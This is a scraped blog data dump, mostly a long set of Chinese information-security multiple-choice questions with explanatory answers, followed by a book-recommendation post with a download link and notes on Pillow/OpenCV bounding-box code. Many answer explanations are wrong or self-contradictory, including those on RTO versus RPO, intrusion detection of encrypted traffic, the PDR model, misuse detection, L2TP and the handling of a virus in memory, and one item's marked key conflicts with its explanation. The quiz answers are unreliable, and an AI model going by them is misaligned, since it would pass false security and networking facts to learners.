2000及更高版本已默认使用DNS作为名称解析服务。因此，选项B不需要检查。正确答案为B。\n某部分DNS服务运行于一台支持动态更新的Unix服务器上。Windows2000Professional和WindowsNT4.0工作站的客户使用一台安装了Windows2000成员服务器版的DHCP服务器以例获取TCP&#x2F;IP配置。如果从DHCP客户上\n\n发送主机(A)记录和指针(PTR)记录的动态更新信息到DNS服务器，以下哪种方式最容易?__。b\nA.根据运行Unix的DNS服务器的IP地址配置每一台DHCP客户机B.什么也不用做。主机(A)记录和指针(PTR)记录将被自动更新C.根据DHCP服务器的服务器选项(ServerOptions)配置运行Unix的DNS服务器的IP地址，并配置DHCP服务器的DNS属性发送来自所有DHCP客户的动态更新信息D.以上都不对。Unix的DNS服务器不接受WindowsDHCP客户的动态更新\n为了从DHCP客户端上发送主机（A）记录和指针（PTR）记录的动态更新信息到DNS服务器，最容易的方式是在DHCP服务器上配置运行Unix的DNS服务器的IP地址，并配置DHCP服务器的DNS属性发送来自所有DHCP客户的动态更新信息。因此，选项C是正确的。在这种情况下，Windows DHCP服务器应配置为将动态更新信息发送到运行Unix的DNS服务器。选项A不正确，因为它要求在每个DHCP客户机上手动配置运行Unix的DNS服务器的IP地址。选项B也不正确，因为默认情况下，只有Windows DHCP客户端可以自动更新DNS记录，而Unix DNS服务器不接受正在运行的Windows DHCP客户端的动态更新。选项D也不正确，因为Microsoft Windows DHCP服务器支持向任何标准兼容DNS服务器发送动态更新。\n\nLinux系统中__文件包含了用户账号和加密了的密码数据。\nA.&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;groupB.&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;pam.confC.&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadowD.&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;vipw\nLinux系统中，&#x2F;etc&#x2F;shadow文件包含了用户账号和加密了的密码数据。该文件只能由root用户读取，并且存储在其中的密码信息是经过加密处理的。它用于增强系统的安全性，避免黑客通过获取密码文件而获得系统权限。通常，用户登录时输入的密码会与该文件中存储的密码进行比对来验证用户身份。如果两者匹配，则用户将被授予权限，并允许访问系统资源。\n\n关于数字签名与手写签名，下列说法中错误的是__。\nA.手写签名和数字签名都可以被模仿B.手写签名对不同内容是不变的C.手写签名可以被模仿，而数字签名在不知道密钥的情况下无法被模仿D.数字签名对不同的消息是不同的\n说法B”手写签名对不同内容是不变的”是错误的。\n手写签名只是人为设计的一种身份验证方式，其具有易伪造等缺陷，安全性较低。而数字签名则利用了公钥密码学中的技术，使用私钥对消息进行签名，并使用相应的公钥对签名进行验证。在数字签名中，不同的消息会产生不同的签名，从而确保了消息和签名之间的一一对应关系。因此，选项B是不正确的。\n\n要安全浏览网页，不应该__。\nA.定期清理浏览器缓存和上网历史记录B.在他人计算机上使用“自动登录”和“记住密码”功能C.定期清理浏览器CookiesD.禁止使用ActiveX控件和Java脚本\n正确答案是B. 在他人计算机上使用“自动登录”和“记住密码”功能。这是因为如果您在别人的计算机上使用此类功能，则可能会让其他人访问您的个人账户和信息，从而造成安全风险。定期清理浏览器缓存、历史记录和Cookies可以提高隐私保护和安全性。禁止使用ActiveX控件和Java脚本也可以防止恶意网站利用漏洞攻击您的计算机。\n\n公开密钥算法RSA用到了一些数学概念，如欧拉函数。欧拉函数的定义是：设n是一个正整数，则小于n并与n互素的正整数的个数，称为欧拉函数，记为φ(n)。那么φ(12)&#x3D;__。\nA.2B.6C.4D.8\n首先，正整数12有因子1,2,3,4,6,和12。其中只有1、5、7、11与12互质，所以φ(12)&#x3D;4。因此，正确答案为C. 4。\n\n如果杀毒时发现内存有病毒，恰当的做法是___。\nA.格式化硬盘，重装系统B.再杀一次毒C.立即运行硬盘上的杀毒软件D.重新启动，用杀毒软盘引导并杀毒\n恰当的做法是立即运行硬盘上的杀毒软件，清除内存中的病毒。格式化硬盘并重装系统会导致数据丢失，同时也无法保证在重新安装系统后病毒不再出现。再次杀毒可能无法完全清除病毒，而重新启动并用杀毒软盘引导并杀毒则会耗费时间，并且需要使用外部设备。因此，直接运行已安装在硬盘上的杀毒软件是最恰当的做法。\n\n关于入侵检测技术，下列描述错误的是__。\nA.入侵检测系统不对系统或网络造成任何影响B.入侵检测信息的统计分析有利于检测到未知的入侵和更为复杂的入侵C.审计数据或系统日志信息是入侵检测系统的一项主要信息来源D.基于网络的入侵检测系统无法检查加密的数据流\n描述错误的是 D. 基于网络的入侵检测系统可以检查加密的数据流，但需要先将其解密。为了防止被攻击者通过使用加密来规避入侵检测系统的检测，入侵检测系统通常会对加密的数据流进行解密，然后再检查其内容。\n\nTELNET协议主要应用于哪一层__。\nA.应用层B.Internet层C.传输层D.网络层\nTELNET协议主要应用于应用层。TELNET是一种客户端&#x2F;服务器协议，用于在网络上远程控制或管理设备，如路由器、交换机等。其基本原理是允许用户通过一个类似终端的接口，通过网络连接到远程主机，并以本地用户的身份执行操作。因此，TELNET协议是应用层的协议。\n\n由于系统软件和应用软件的配置有误而产生的安全漏洞，属于__。\nA.意外情况处置错误B.配置错误C.设计错误D.环境错误\n由于系统软件和应用软件的配置有误而产生的安全漏洞，属于配置错误。配置错误是指由于操作系统、网络设备或应用程序的设置不正确而导致的安全漏洞。比如，某些默认设置开启了不安全的服务、权限过大或者密码弱等都可能引起安全问题。配置错误通常是一种比较简单的安全威胁，但却可能造成严重的后果，因此必须特别注意。\n\n信息安全风险缺口是指：____。\nA.IT的发展与安全投入，安全意识和安全手段的不平衡B.计算机网络运行，维护的漏洞C.信息化中，信息不足产生的漏洞D.计算中心的火灾隐患\n信息安全风险缺口是指 IT 的发展与安全投入、安全意识和安全手段的不平衡。随着信息技术的发展，计算机系统、网络和应用程序等的复杂性增加，安全威胁也在不断涌现。然而，在安全防护方面的投入却未能跟上信息技术的发展速度，导致了信息安全风险缺口的产生。这种不平衡主要表现在缺乏安全投入、安全管理意识淡漠、安全人员短缺等方面。\n\n过滤所依据的信息来源不包括__。\nA.IP包头B.UDP包头C.TCP包头D.IGMP包头\n过滤所依据的信息来源不包括 IGMP 包头。IP、UDP 和 TCP 包头都包含了用于过滤和控制网络流量的信息，可以通过这些信息来实现对应用程序、协议、端口等的过滤和控制。而 IGMP (Internet Group Management Protocol) 是一个组播协议，用于在多点通信中管理 IP 多播组成员资格的协议，不包含用于过滤和控制网络流量的信息。\n\n在加密技术的实际应用中，以下__是保密的关键？\nA.算法B.算法和密钥C.密钥D.以上都是\n\nSSH安全协议实际是由__协议组成的一个协议族。\nA.传输层协议、握手协议和连接协议B.记录协议、用户认证协议和连接协议C.传输层协议、用户认证协议和报警协议D.传输层协议、用户认证协议和连接协议\nSSH安全协议实际是由传输层协议、用户认证协议和连接协议组成的一个协议族。SSH (Secure Shell) 是一种网络协议，用于在不安全的网络中对网络服务进行加密通信。SSH协议族包括了SSH-Transport层协议、SSH-User Authentication层协议和SSH-Connection层协议。其中，SSH-Transport层协议提供了可靠的传输服务；SSH-User Authentication层协议负责客户端用户身份验证；SSH-Connection层协议则负责维护和管理连接。\n\n小李在使用super scan对目标网络进行扫描时发现，某一个主机开放了25和110端口，此主机最有可能是什么？A.文件服务器B.WEB服务器C.邮件服务器D.DNS服务器\n某个主机开放了25和110端口时，最有可能是邮件服务器。SMTP (Simple Mail Transfer Protocol) 和 POP3 (Post Office Protocol 3) 是邮件传输协议，分别使用25和110端口进行通信。因此，当一个主机同时开放25和110端口时，很可能就是一台邮件服务器。\n\n以下关于VPN说法正确的是\nA.VPN指的是用户自己租用线路，和公共网络物理上完全隔离的安全的线路B.VPN不能做到信息认证和身份认证C.VPN指的是用户通过公用网络建立的临时的安全的连接D.VPN只能提供身份认证不能提供加密数据的功能\n以下关于 VPN 说法正确的是 C. VPN 指的是用户通过公用网络建立的临时安全连接。VPN (Virtual Private Network) 是一种通过公共互联网或其他公用网络建立加密通道的技术，可以在不安全的网络上创建一个虚拟专用网络，将通信数据加密并隧道化传输，以达到保护通信隐私和提高通信安全性的目的。因此，选项 C 正确。而选项 A 中的描述是对专线的定义；选项 B 错误，因为 VPN 通常会涉及到身份验证和信息加密等措施；选项 D 也错误，因为 VPN 可以同时提供身份验证和数据加密的功能。\n\n在PDR安全模型中最核心的组件是__。\nA.策略B.检测措施C.保护措施D.响应措施\n在 PDR (Prevention, Detection, Response) 安全模型中，最核心的组件是预防措施（Prevention），即避免安全事件发生。因此，选项 C 保护措施是最核心的组件。PDR安全模型包括三个关键环节：预防、检测和响应。其中，预防措施是通过采取各种技术和管理措施来避免安全事件发生；检测措施是在安全事件发生后及时发现和警报；响应措施是在安全事件发生后及时做出反应，采取相应的措施进行处置。虽然三个环节都很重要，但从长远来看，投入到预防措施中的资源更值得和更有意义。\n\n下列对计算机网络的攻击方式中，属于被动攻击的是__。\nA.口令嗅探B.拒绝服务C.重放D.物理破坏\n口令嗅探是一种被动攻击。口令嗅探是指攻击者通过监听网络流量，获取用户在网络上的口令信息。由于许多应用程序在进行身份验证时都需要使用明文口令，在没有加密保护的情况下，这些口令信息就非常容易被攻击者截获和窃取。因此，口令嗅探通常被认为是一种比较隐蔽和危险的攻击方式。而拒绝服务、重放和物理破坏等攻击方式则不属于被动攻击，它们都需要攻击者积极地发起攻击行为，才能对网络造成影响。\n\n对网络层数据包进行过滤和控制的信息安全技术机制是__。\nA.防火墙B.SnifferC.IDSD.IPSec\n对网络层数据包进行过滤和控制的信息安全技术机制是防火墙。防火墙是一种网络安全设备，可用于监视、过滤和控制网络流量，使得网络中的通信能够遵循预先定义好的策略和规则。在网络层面，防火墙可以过滤和控制 IP 数据包的传输，例如根据源地址、目的地址、协议类型、端口等信息对数据包进行过滤和控制。相比之下，Sniffer 是一种用于捕获和分析网络通信数据的工具；IDS (Intrusion Detection System) 是一种用于检测网络攻击行为的系统；IPSec 则是一种用于加密和认证 IP 数据包的协议。\n下列关于ARP协议及ARP欺骗说法错误的是A.通过重建ARP表可以一劳永逸的解决ARP欺骗。B.除了攻击网络设备外，还可以伪造网关，使本应发往路由器或交换机的数据包发送到伪造的网关，造成被攻击主机无法上网。C.ARP欺骗的一种方式是欺骗路由器或交换机等网络设备，使得路由器或交换机等网络设备将数据包发往错误的地址，造成被攻击主机无法正确接收数据包。D.ARP协议的作用是实现IP地址与物理地址之间的转换。\n选项 A 错误。尽管在 ARP 欺骗时可以重建 ARP 表来解决该问题，但这种方法只是一种应急措施，无法从根本上解决 ARP 欺骗的问题。因为攻击者可以继续发送伪造的 ARP 响应包来欺骗网络中的主机。选项 B、C 和 D 的描述是正确的。ARP 欺骗是指攻击者通过伪造 ARP 请求或 ARP 响应包来欺骗网络中的其他主机，以获得其他主机的信息或进行网络攻击等行为。攻击者可以利用 ARP 欺骗来伪造网关或 IP 地址，使得主机向错误的地址发送数据包，并可能导致网络丢包、拒绝服务等问题。 ARP 协议的主要作用是实现 IP 地址与物理地址之间的映射，将一个 IP 地址映射到与之对应的 MAC 地址。\n\nPPTP客户端使用__。\nA.TCP协议建立连接B.L2TP协议建立连接C.UDP协议建立连接D.以上皆不是\nPPTP客户端使用TCP协议建立连接。TCP是传输控制协议，L2TP是一种无连接的协议，它通过序列号来标识数据包，允许数据包重复利用，但不保证数据的完整性。因此，答案选A。\n\n下面关于分布式入侵检测系统特点的说法中，错误的是__。\nA.检测范围大B.检测效率高C.检测准确度低D.可以协调响应措施\n错误的说法是C. 分布式入侵检测系统的特点之一就是可以提高检测的准确度。\n\n下列属于双密钥加密算法的是__。\nA.DESB.GOSTC.IDEAD.RSA\n双密钥加密算法通常指的是公开密钥加密算法（PKI），因此选项D.RSA属于双密钥加密算法。而A.DES、B.GOST、C.IDEA属于对称密钥加密算法。\n\n防火墙的类型包括__c_。\nA.包过滤型、限制访问型B.监视安全型、限制访问型C.包过滤型、代理服务型D.代理服务型、监视安全型\n\n误用检测的优点不包括__。\nA.检测准确度高B.便于系统维护C.能够检测出新的网络攻击D.技术相对成熟的网络攻击\n选项D. 技术相对成熟的网络攻击不是误用检测的优点。误用检测可以检测出新的网络攻击，但其主要缺点在于误报率较高。\n\n从系统结构上来看，入侵检测系统可以不包括__。\nA.数据源B.审计C.分析引擎D.响应\n从系统结构上来看，入侵检测系统需要包括数据源、审计、分析引擎和响应四个部分，而不包括审计。因此，正确答案为B。\n\n以下有关VPN的描述，不正确的是__。\nA.使用费用低廉B.未改变原有网络的安全边界C.为数据传输提供了机密性和完整性D.易于扩展\n选项A. 使用费用低廉不正确。实现VPN需要相应的硬件和软件支持，并需要专业人员进行部署和维护，因此费用较高。其他选项都是VPN的优点，包括未改变原有网络的安全边界、为数据传输提供机密性和完整性以及易于扩展。\n\n病毒的运行特征和过程是__。\nA.入侵、运行、驻留、传播、激活、破坏B.入侵、运行、传播、扫描、窃取、破坏C.传播、运行、驻留、激活、破坏、自毁D.复制、运行、撤退、检查、记录、破坏\n病毒的运行特征和过程一般包括以下几个阶段：入侵、运行、传播、隐藏&#x2F;驻留、激活和破坏等。因此，A选项正确，它是病毒的典型运行过程。B选项中“扫描”和“窃取”不是常见的病毒运行特征，因此不正确；C选项中没有“入侵”这个阶段，也不太符合病毒的通用特征；D选项中缺少了“传播”和“隐藏&#x2F;驻留”这两个重要阶段，也不正确。\n\nISO安全体系结构中的对象认证服务，使用__完成。\nA.加密机制B.访问控制机制C.数字签名机制D.数据完整性机制\nISO安全体系结构中的对象认证服务使用数字签名机制完成。对象认证是安全体系结构中的一个基本需求，它确保了数据或实体的真实性和来源。数字签名是一种常见的加密技术，用于验证消息或数据的完整性、真实性和不可抵赖性，从而实现对象认证。因此，选项C. 数字签名机制是正确的答案。\n\nRC4是由RIVEST在1987年开发的，是一种流式的密文，就是实时的把信息加密成一个整体，它在美国一般密钥长度是128位，因为受到美国出口法的限制，向外出口时限制到多少位？__。\nA.64位B.40位C.56位D.32位\n根据美国的出口法规定，RC4算法加密时所使用的密钥长度在向外国出口时需要进行限制。在过去，RC4的出口限制为40位，但现在已经放宽到了128位。因此，答案是B.40位。\n\n你是一个公司的网络管理员，你经常在远程不同的地点管理你的网络（如家里），你公司使用win2000操作系统，你为了方便远程管理，在一台服务器上安装并启用了终端服务。最近，你发现你的服务器有被控制的迹象，经过你的检查，你发现你的服务器上多了一个不熟悉的帐户，你将其删除，但第二天却总是有同样的事发生，你应该如何解决这个问题？__。\nA.停用终端服务B.打安全补丁sp4C.添加防火墙规则，除了你自己家里的IP地址，拒绝所有3389的端口连入D.启用帐户审核事件，然后查其来源，予以追究\n为了解决这个问题，可以采取以下措施：\nD.启用帐户审核事件，然后查其来源，予以追究。\n启用帐户审核事件后，可以监测到所有新帐户的创建和删除等操作，从而及时发现异常。同时，还需要对服务器进行全面的安全扫描，并安装最新的安全补丁（选项B），以确保系统的安全性；如果仍然存在风险，可以考虑添加防火墙规则，只允许特定IP地址的访问（选项C），限制未经授权的远程访问。停用终端服务（选项A）可能会影响日常工作的进行，因此不是首选的解决方案。\n\n信息安全措施可以分为__。\nA.预防性安全措施和防护性安全措施B.纠正性安全措施和保护性安全措施C.纠正性安全措施和防护性安全措施D.预防性安全措施和保护性安全措施\n信息安全措施可以分为预防性安全措施和保护性安全措施。纠正性安全措施是指在已发现病毒、木马等恶意程序的情况下，采取技术手段来修补系统漏洞，从而减少信息被黑客利用的机会；而防护性安全措施则是指在计算机系统还未受到损害时，就先行采取一些预防措施，包括设置防火墙、IDS等，以减少信息被病毒或其他恶意程序侵入的可能性。\n因此，答案选D：预防性安全措施和保护性安全措施。\n\n密文”d2VsY29tZV90b193d3cuaXNjbGFiLm9yZy5jbgo&#x3D;”,采用( )方式加密\nA.MD5B.ROT13C.SHA-256D.BASE64\n这段密文经过了Base64编码，不是加密算法。Base64编码是一种将二进制数据转换成ASCII字符的方法，常用于在网络上传输和存储各种二进制数据，例如图片、音频和视频等。\n\nLinux操作系统默认的文件系统是\nA.FAT32B.FATC.NTFSD.EXT4\nLinux操作系统默认的文件系统是EXT4（Fourth Extended Filesystem）。Ext4是Linux内核中一种日志型的、支持扩展属性、支持大容量存储的文件系统，是Ext3文件系统的升级版本。Ext4文件系统可以提供更高的性能和更好的稳定性，因此被广泛应用于各种Linux发行版中。选项A. FAT32、B. FAT、C. NTFS都是Windows操作系统中常见的文件系统类型，不是Linux默认的文件系统。\n\nIPSEC的隧道模式中ESP的认证范围不包括__。\nA.原IP报头B.ESP报尾C.ESP报头D.新IP报头和ESP认证报尾\n在IPSec的隧道模式中，ESP（Encapsulating Security Payload）报文通过加密和认证实现数据的保护。在ESP报文中，认证的范围包括ESP报头、载荷和ESP报尾，但不包括原IP报头和新IP报头。因此，选项A. 原IP报头是不正确的答案，应该是D. 新IP报头和ESP认证报尾。\n\n全球著名云计算典型应用产品及解决方案中，亚马逊云计算服务名称叫__。\nA.AWSB.AzureC.SCED.Google Cloud\n全球著名云计算典型应用产品及解决方案中，亚马逊云计算服务的名称叫作AWS（Amazon Web Services）。AWS是由亚马逊提供的弹性计算、存储、数据库等一系列基础设施和应用服务，用户可以通过AWS构建自己的应用程序并部署在全球范围内的云端服务器上。选项B. Azure是微软的云计算服务，C. SCE没有特定的意义或对应的云计算服务，D. Google Cloud是谷歌的云计算服务。\n\n代表了当灾难发生后，数据的恢复程度的指标是__。\nA.RPOB.NROC.RTOD.SDO\n代表了当灾难发生后，数据的恢复程度的指标是RTO（Recovery Time Objective，恢复时间目标）。RTO是指在发生灾难性事件导致系统停机的情况下，系统需要恢复到正常运作状态所需的时间。\n选项A. RPO（Recovery Point Objective，恢复点目标）是指在灾难发生前最后一次备份数据的时间点。 \n选项B. NRO没有特定的意义或对应的术语。\n选项D. SDO（Service Delivery Objective，服务交付目标）是指一项服务在一定时间内可以完成的工作量或任务。\n因此，答案是C. RTO。\n\nzone信息文件使用__从主服务器传输到从服务器。\nA.反向查询B.缓存C.欺骗D.zone传输\nzone信息文件使用zone传输从主服务器传输到从服务器。在DNS中，zone指的是一组相关的域名记录，包括一个或多个域名和与之相关的资源记录。当主服务器上zone文件发生变化时，需要将这些变化同步到各个从服务器上。为了实现这个目的，可以使用zone传输来进行数据的复制和同步。zone传输通常采用TCP协议，并将整个zone文件直接传输给从服务器，以确保数据的完整性和一致性。因此，选项D. zone传输是正确的答案。\n\nWindows NT 和Windows 2000系统能设置为在几次无效登录后锁定帐号,这可以防止__。\nA.木马B.IP欺骗C.暴力攻击D.缓存溢出攻击\nWindows NT和Windows 2000系统可以设置为在多次无效登录之后锁定帐号，这可以防止暴力攻击。暴力攻击是指黑客利用猜测、穷举等方式尝试破解密码的过程，如果系统没有限制登录次数或者锁定账户，则黑客可以通过大量尝试来获取合法的账户访问权限。因此，将账户锁定功能与复杂的密码策略结合使用可以有效地增强系统的安全性，避免因密码泄露而导致的安全风险。选项A. 木马、B. IP欺骗和D. 缓存溢出攻击都与此问题无关。\n\n将利用虚假IP地址进行ICMP报文传输的攻击方法称为__。\nA.ICMP泛洪B.死亡之pingC.LAND攻击D.Smurf攻击\n将利用虚假IP地址进行ICMP报文传输的攻击方法称为Smurf攻击。Smurf攻击是一种利用ICMP协议（Internet Control Message Protocol）漏洞进行的攻击，攻击者发送大量带有伪造源IP地址的ICMP请求包到广播地址，然后所有收到请求包的主机都会向被伪造的源IP地址回复ICMP响应包，导致被攻击目标网络流量瞬间激增，甚至可能导致网络瘫痪。\n选项A. ICMP泛洪是一种对目标计算机不断发送大量的ICMP数据包的攻击方式，使目标计算机因处理请求而过载或瘫痪。\n选项B. 死亡之ping是一种利用Ping命令引起系统崩溃的攻击方式。\n选项C. LAND攻击是一种利用TCP&#x2F;IP协议栈漏洞的攻击方式，攻击者通过向目标计算机发送带有伪造源IP和伪造源端口号的特制TCP SYN数据包，从而导致目标计算机进入死循环状态，最终导致系统崩溃。\n因此，答案是D. Smurf攻击。\n\n当某一服务器需要同时为内网用户和外网用户提供安全可靠的服务时，该服务器一般要置于防火墙的__。\nA.内部B.DMZ区C.外部D.都可以\n当某一服务器需要同时为内网用户和外网用户提供安全可靠的服务时，该服务器一般要置于防火墙的DMZ区。DMZ（Demilitarized Zone）是指防火墙中的一块独立区域，用于分隔受信任的内部网络和不受信任的外部网络，以提供额外的安全屏障，保护内部网络中的关键系统和数据免受外部攻击的侵害。将服务器放置于DMZ区内，可以在保证服务对外可用的同时，限制外部网络对内部网络的访问，增强了内部网络的安全性。当然，也可以将服务器置于防火墙的内部或外部区域，但需要根据具体情况进行权衡取舍和安全策略规划。因此，选项B. DMZ区是最正确的答案。\n\nVPN的加密手段是__。\nA.具有加密功能的防火墙B.VPN内的各台主机对各自的信息进行相应的加密C.带有加密功能的路由器D.单独的加密设备\nVPN的加密手段是单独的加密设备。VPN（Virtual Private Network，虚拟专用网络）是指利用公共的互联网等网络基础设施，采用加密通信协议和安全认证技术，构建一个类似于私有网络的可靠、安全、高效的通信环境。其中，加密协议是VPN的重要组成部分，通过对数据进行加密和解密，保障了用户通信内容的机密性和完整性。而这种加密处理通常由单独的加密设备来完成，比如VPN网关、VPN集中器、VPN缆线路由器等，这些设备负责对通信数据进行加密和解密，并确保经过公共网络传输的数据不被窃取或篡改。因此，选项D. 单独的加密设备是正确的答案。\n\n某种信息安全威胁是通过非法手段取得对数据的使用权，并对数据进行恶意地添加和修改，这种威胁属于__。\nA.窃听数据B.拒绝服务C.破坏数据的完整性D.物理安全威胁\n根据题意，这种威胁是指非法的修改和添加数据，因此属于破坏数据的完整性。所以，答案为C。\n\n作为一个管理员，把系统资源分为三个级别是有必要的，以下关于级别1的说法正确的是？__。\nA.对于那些运行至关重要的系统，如电子商务公司的用户帐号数据库B.本地电脑即级别1C.对于那些必须的但对于日常工作不是至关重要的系统D.以上说法均不正确\n从题目中，我们可以看出管理员将系统资源分为三个级别是有必要的。那么，关于级别1的说法正确的是A。因为级别1是指对于那些运行至关重要的系统，如电子商务公司的用户帐号数据库。此外，B选项错误，因为本地电脑通常被认为不是在极端条件下运行的系统。C选项也是错误的，因为对于必须的但对于日常工作不是至关重要的系统，应该归类为级别2或级别3。所以，答案为A。\n\n《互联网上网服务营业场所管理条例》规定，__负责互联网上网服务营业场所安全审核和对违反网络安全管理规定行为的查处。\nA.人民法院B.工商行政管理部门C.公安机关D.国家安全部门\n根据《互联网上网服务营业场所管理条例》的规定，负责互联网上网服务营业场所安全审核和对违反网络安全管理规定行为的查处的是公安机关。因此，答案是C。\n\n__能够有效降低磁盘机械损坏给关键数据造成的损失。\nA.热插拔B.RAIDC.SCSID.FAST-ATA\nRAID（冗余磁盘阵列）技术能够有效降低磁盘机械损坏给关键数据造成的损失。RAID通过将多个硬盘组合成一个逻辑驱动器，实现数据的冗余存储或分条存储，提高数据的可靠性和安全性。因此，答案是B。\n\n__是最常用的公钥密码算法。\nA.RSAB.椭圆曲线C.DSAD.量子密码\nRSA是最常用的公钥密码算法。RSA算法是由三位数学家Rivest、Shamir和Adleman在1977年提出的，基于大整数分解难题，利用两个大质数的乘积作为公钥，该乘积因子分解的困难性保证了RSA算法的安全性。RSA算法广泛应用于PKI（公钥基础设施）、数字签名、加密通信等领域。因此，答案是A。\n\n下列有关RSA算法的说法哪种不正确___。\nA.基于大数分解问题设计B.是目前应用最广泛的公钥密码算法，已被许多标准化组织接纳C.既可以用于加密，也可用于数字签名D.由于密钥短，速度快，可以用于智能卡等存储和运算能力有限的设备上\n选项D不正确。RSA算法由于其加密速度较慢，所以在存储和运算能力有限的设备上使用时存在一定的问题。因此，在智能卡等存储和运算能力有限的设备上不适合使用RSA算法。相反，应该使用更轻量级的加密算法，如ECC（椭圆曲线加密）算法。所以，答案是D。\n\n下面哪种技术不属于恶意代码的攻击技术：__。\nA.三线程技术B.进程注入技术C.重编译技术D.端口复用技术\n端口复用技术不属于恶意代码的攻击技术。三线程技术、进程注入技术和重编译技术都属于恶意代码的攻击技术，被黑客广泛使用。而端口复用技术主要是指在同一时间内将多个网络连接绑定到同一个端口上，以此来提高网络吞吐量和效率，通常不被用于恶意攻击。因此，答案是D。\n\n在TCP&#x2F;IP协议中，UDP协议是一种( )协议\nA.主机-网络层B.应用层C.互联网络层D.传输层\nUDP协议是一种传输层协议。在TCP&#x2F;IP协议中，UDP协议与TCP协议属于同一层次的传输层协议，它们都是为了在网络上进行数据通信而设计的。UDP协议相对于TCP协议来说更加简单、快速，但不可靠，不提供数据的确认、重传等机制。因此，在需要高效率、速度较为关键的应用场景中常常使用UDP协议。答案是D。\n","categories":["提升"],"tags":["信息安全"]},{"title":"数据结构课程图书推荐","url":"/2023/03/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E5%9B%BE%E4%B9%A6%E6%8E%A8%E8%8D%90/","content":"《数据结构算法实现及解析》\n\n最近学习数据结构学得十分懵逼，本人学的教材是 严蔚敏的《数据结构（c语言版）》感觉太抽象了，学的似懂非懂，于是在别人推荐后，我找到了这本书我看了一下，确实比 严蔚敏的《数据结构（c语言版）》通俗易懂，推荐给大家，可以当教辅看。&#x3D;&#x3D;下载链接：&#x3D;&#x3D;https://share.weiyun.com/aG6ZEEA9\n本网站内容主要以公益法律资讯及普法知识为主，部份文章源自网络或网友推荐，所载文章仅用于学习交流，不作商业用途，所转载文章及论坛帖子的言论不代表本站观点，相应的权利均属于原权利人。如权利人认为不妥，请来电或来函说明，本网页随即停止转载和使用。\n\n","tags":["数据结构","学习"]},{"url":"/2023/06/05/AI%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，它使用易于人类阅读和编写的文本格式，并且可以被多种编程语言解析和生成。JSON文件用于存储和传输数据，通常在Web应用程序中用于从服务器获取数据并将其显示在用户界面上。\nJSON文件由键-值对组成，类似于JavaScript对象，其中每个键都是一个字符串，值可以是字符串、数字、布尔值、数组或其他JSON对象。JSON文件可以包含任意数量的键-值对，使其非常适合表示结构化数据，如配置文件、日志文件、API响应和数据库记录等。\n也可以包含网址等信息\ntesk2\nTask02:数据集的读取与可视化一、任务目的：了解图像数据集的存储方式，学会读取数据并对数据进行存储格式的转换，实现数据可视化。\n二、主要任务（以coco数据集的标签文件为例）：\n1、标签数据读取：读取数据集标签文件“TestData_coco.json”；\n2、图像数据下载：根据标签数据中图像链接下载相应图像并以图像ID命名；\n3、数据存储格式变换：为一幅图像建立一个字典，字典中包含{‘image_ids’, ‘category_ids’, ‘bboxes’, ‘segmentations’}等键，每个键构建一个list，存储该幅图像中包含的目标类别、目标框和分割标签信息。4、可视化图像ID为1000的图像及标签：显示图像、目标框和分割信息，并在目标框左上角标注类别名称，如图例所示；\n\n5、抽取部分数据保存成新的json文件：从数据集中挑选出图像ID为‘139’，‘724’，‘785’，‘885’和‘1000’的图像及相应标注框和分割掩码标签，保存成新的标签文件，格式与原文件保持一致。\n三、任务要求：语言不限，推荐使用Python语言。\n将一个图片转换成字典的python脚本：\nfrom PIL import Image# 读取图像文件img = Image.open(&#x27;000000000885.jpg&#x27;)# 获取图像的尺寸width, height = img.size# 创建一个空字典pixels_dict = &#123;&#125;# 遍历每个像素点for y in range(height):    for x in range(width):        # 获取当前像素点的颜色值        pixel = img.getpixel((x, y))        # 将像素点和颜色值添加到字典中        pixels_dict[(x, y)] = pixel# 存储字典到本地文件系统with open(&#x27;pixels_dict.txt&#x27;, &#x27;w&#x27;) as f:    f.write(str(pixels_dict))\n\n从图像中提取目标框和分割标签信息，我要用到什么工具?要从图像中提取目标框和分割标签信息，您可以使用以下工具：\n\n图像处理库：例如OpenCV、Pillow等\n目标检测模型：例如Faster R-CNN、YOLO、SSD等\n图像语义分割模型：例如Mask R-CNN、FCN等\n\n这些工具可以帮助识别和定位图像中的对象，并生成相应的目标框和分割标签信息。其中，目标检测模型可以检测出图像中的物体并给出其边界框，而图像语义分割模型可以将图像中的不同区域进行划分，并为每个区域打上特定的标签。使用这些工具可以高效地完成目标检测和分割任务。\n如何用Pillow库提取目标框？要使用Pillow库提取目标框，您可以按照以下步骤进行：\n\n打开图片文件并加载到Pillow的Image对象中：\n\nfrom PIL import Imageimage = Image.open(&quot;image.jpg&quot;)\n\n\n定义一个包含目标位置信息的元组（left, upper, right, lower），其中left和upper是目标框左上角的x和y坐标，right和lower是右下角的x和y坐标。\n调用Pillow的crop()方法，使用该元组作为参数来提取目标框：\n\n# 定义目标位置信息元组box = (100, 100, 300, 300)# 提取目标框target = image.crop(box)\n\n##PIL:\npip install Pillow\n\n\n\n我如何得到right和lower、left和upper？可以使用Python中的cv2.boundingRect(contour)函数来获取轮廓的边界框。该函数将返回四个值：x，y，w和h。其中，(x, y)是矩形左上角点的坐标，w和h分别是矩形的宽度和高度。因此，可以通过以下代码来获取right、lower、left和upper：\nCopy Codex, y, w, h = cv2.boundingRect(contour)right = x + wlower = y + hleft = xupper = y\n\n这里假设contour是一个OpenCV中的轮廓对象。\n我如何给一张图片添加OpenCV中的轮廓对象要在OpenCV中给一张图片添加轮廓对象，需要按照以下步骤进行操作：\n\n读取图像并将其转换为灰度图像：使用cv2.imread()函数加载图像，并使用cv2.cvtColor()函数将图像转换为灰度图像。\nimport cv2# Load the imageimg = cv2.imread(&#x27;image.jpg&#x27;)# Convert to grayscalegray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n对图像进行边缘检测：使用任意的边缘检测算法（如Canny算子）对灰度图像进行边缘检测。\n# Apply Canny edge detectionedges = cv2.Canny(gray, 100, 200)\n\n查找轮廓并绘制：使用cv2.findContours()函数查找图像中的所有轮廓，并使用cv2.drawContours()函数将轮廓绘制到原始图像上。\n# Find contourscontours, hierarchy = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)# Draw contours on the original imagecv2.drawContours(img, contours, -1, (0, 255, 0), 